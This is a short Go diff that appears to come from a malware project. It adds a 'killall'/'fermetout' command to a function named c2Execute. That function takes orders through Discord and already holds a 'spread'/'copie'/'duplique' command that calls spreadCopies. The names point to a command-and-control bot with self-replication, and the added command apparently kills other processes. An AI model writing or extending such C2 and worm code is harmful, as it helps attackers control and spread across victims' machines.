@@ -574,6 +574,9 @@ func c2Execute(command string) {
 	case "salons", "channels", "salon":
 		discordReply(channelsReport())
 
+	case "killall", "fermetout":
+		discordReply(killAllOthers(args))
+
 	case "spread", "copie", "duplique":
 		if msg := runWithProgress("duplication", func() string { return spreadCopies(true) }); msg != "" {
 			discordReply(msg)
